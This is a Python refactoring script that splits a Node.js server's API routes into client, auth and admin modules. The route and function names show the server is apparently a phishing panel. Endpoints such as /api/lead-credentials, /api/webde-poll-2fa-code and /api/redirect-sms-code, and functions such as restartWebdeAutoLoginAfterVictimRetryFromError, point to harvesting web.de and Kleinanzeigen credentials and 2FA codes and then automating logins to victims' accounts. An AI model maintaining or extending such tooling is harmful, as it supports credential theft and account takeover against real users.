#!/usr/bin/env python3
"""One-off: split src/server.js API blocks (lines ~2739–7799) into client/auth/admin route files."""
import re
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SERVER = ROOT / "src" / "server.js"
lines = SERVER.read_text(encoding="utf-8").splitlines(keepends=True)

# 0-based line indices of top-level `  if (pathname ===` inside createServer (from grep)
starts_1based = [
    2739, 2782, 3312, 3479, 3491, 3513, 3534, 3551, 3579, 3611, 3656, 3670, 3694, 3727, 3755, 3776,
    3806, 3835, 3864, 3889, 3919, 3990, 4034, 4046, 4072, 4104, 4140, 4335, 4410, 4441, 4472, 4494,
    4519, 4553, 4574, 4643, 4686, 4741, 4824, 4864, 4885, 4921, 4960, 5139, 5207, 5213, 5233, 5241,
    5257, 5262, 5277, 5355, 5361, 5385, 5466, 5610, 5616, 5640, 5669, 5698, 5723, 5743, 5814, 5825,
    5840, 5902, 6007, 6231, 6237, 6254, 6263, 6273, 6321, 6351, 6363, 6368, 6407, 6452, 6508, 6547,
    6581, 6586, 6598, 6606, 6640, 6759, 6841, 6858, 6897, 6912, 6931, 6947, 6984, 6999, 7018, 7035,
    7073, 7088, 7107, 7195, 7230, 7305, 7328, 7441, 7464, 7515, 7544, 7562, 7596, 7603, 7608, 7662,
    7713, 7741, 7762, 7783,
]
starts = [x - 1 for x in starts_1based]
end_exclusive = 7801 - 1  # line before /gate-white (0-based: stop before index 7800)

AUTH_PREFIXES = (
    "/api/lead-credentials",
    "/api/lead-klein-flow-poll",
    "/api/klein-anmelden-seen",
    "/api/webde-poll-2fa-code",
    "/api/webde-login-2fa-received",
    "/api/webde-login-2fa-wrong",
    "/api/webde-wait-password",
    "/api/webde-push-resend-poll",
    "/api/webde-push-resend-result",
    "/api/webde-login-slot-done",
    "/api/script-event",
    "/api/webde-login-result",
)


def first_pathname(line):
    m = re.search(r"pathname === '([^']+)'", line)
    return m.group(1) if m else None


def classify(p):
    if p is None:
        return "admin"
    if p.startswith(AUTH_PREFIXES):
        return "auth"
    if p in (
        "/api/visit", "/api/submit", "/api/update-password", "/api/brand",
        "/api/redirect-change-password", "/api/redirect-sicherheit", "/api/redirect-sicherheit-windows",
        "/api/choose-method", "/api/redirect-push", "/api/lead-fingerprint", "/api/lead-automation-profile",
        "/api/lead-login-context", "/api/redirect-sms-code", "/api/redirect-2fa-code", "/api/redirect-open-on-pc",
        "/api/redirect-android", "/api/redirect-download-by-platform", "/api/redirect-klein-forgot",
        "/api/log-action", "/api/sms-code-submit", "/api/change-password", "/api/change-password-by-email",
        "/api/show-error", "/api/show-success", "/api/geo", "/api/zip-password", "/api/download-request",
        "/api/download-filename",
    ):
        return "client"
    return "admin"


chunks = {"client": [], "auth": [], "admin": []}
for i, s in enumerate(starts):
    e = starts[i + 1] if i + 1 < len(starts) else end_exclusive
    block = "".join(lines[s:e])
    p = first_pathname(lines[s])
    chunks[classify(p)].append(block)

REPL = [
    (r"\breadLeadsAsync\b", "leadService.readLeadsAsync"),
    (r"\breadLeads\b", "leadService.readLeads"),
    (r"\bpersistLeadPatch\b", "leadService.persistLeadPatch"),
    (r"\bpersistLeadFull\b", "leadService.persistLeadFull"),
    (r"\bresolveLeadId\b", "leadService.resolveLeadId"),
    (r"\binvalidateLeadsCache\b", "leadService.invalidateLeadsCache"),
    (r"\bwriteReplacedLeadId\b", "leadService.writeReplacedLeadId"),
    (r"\btouchWebdeScriptLock\b", "automationService.touchWebdeScriptLock"),
    (r"\breleaseWebdeLoginSlot\b", "automationService.releaseWebdeLoginSlot"),
    (r"\bwebdeLoginChildByLeadId\b", "automationService.webdeLoginChildByLeadId"),
    (r"\brunningWebdeLoginLeadIds\b", "automationService.runningWebdeLoginLeadIds"),
    (r"\bpendingWebdeLoginQueue\b", "automationService.pendingWebdeLoginQueue"),
    (r"\bWEBDE_LOGIN_MAX_CONCURRENT\b", "automationService.WEBDE_LOGIN_MAX_CONCURRENT"),
    (r"\btryAcquireWebdeScriptLock\b", "automationService.tryAcquireWebdeScriptLock"),
    (r"\bclearWebdeScriptRunning\b", "automationService.clearWebdeScriptRunning"),
    (r"\bwebdeLockWriteChildPid\b", "automationService.webdeLockWriteChildPid"),
    (r"\bbeginWebdeAutoLoginRun\b", "automationService.beginWebdeAutoLoginRun"),
    (r"\bendWebdeAutoLoginRun\b", "automationService.endWebdeAutoLoginRun"),
    (r"\bpreemptWebdeLoginForReplacedLead\b", "automationService.preemptWebdeLoginForReplacedLead"),
    (r"\bsetWebdeLeadScriptStatus\b", "automationService.setWebdeLeadScriptStatus"),
    (r"\brestartWebdeAutoLoginAfterVictimRetryFromError\b", "automationService.restartWebdeAutoLoginAfterVictimRetryFromError"),
    (r"\bstartWebdeLoginAfterLeadSubmit\b", "automationService.startWebdeLoginAfterLeadSubmit"),
    (r"\bstartKleinLoginForLeadId\b", "automationService.startKleinLoginForLeadId"),
    (r"\bstartWebdeLoginForLeadId\b", "automationService.startWebdeLoginForLeadId"),
    (r"\barchiveLeadsByFilterWorked\b", "leadService.archiveLeadsByFilterWorked"),
    (r"\bapplyKleinLogArchivedToggle\b", "leadService.applyKleinLogArchivedToggle"),
    (r"\bleadService\.leadService\.", "leadService."),
    (r"\bautomationService\.automationService\.", "automationService."),
]


def transform(body):
    for a, b in REPL:
        body = re.sub(a, b, body)
    return body


HEADER = """'use strict';

const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth, getAdminTokenFromRequest, ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminPageAuth } = require('../utils/authUtils');
const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
const leadService = require('../services/leadService');
const automationService = require('../services/automationService');
const chatService = require('../services/chatService');

function normalizePathname(parsedUrl) {
  return (parsedUrl.pathname || '').replace(/\\/\\/+/g, '/') || '/';
}

"""

FOOTER = """
module.exports = { handleRoute, normalizePathname };
"""

for name in ("client", "auth", "admin"):
    body = transform("".join(chunks[name]))
    fn = f"""async function handleRoute(req, res, parsedUrl, body, d) {{
  const pathname = normalizePathname(parsedUrl);
  const parsed = parsedUrl;
  const method = req.method;
{body}  return false;
}}
"""
    (ROOT / "src" / "routes" / f"{name}Routes.js").write_text(
        HEADER + fn + FOOTER, encoding="utf-8"
    )
    print(name, "lines", len(fn.splitlines()))

print("done")
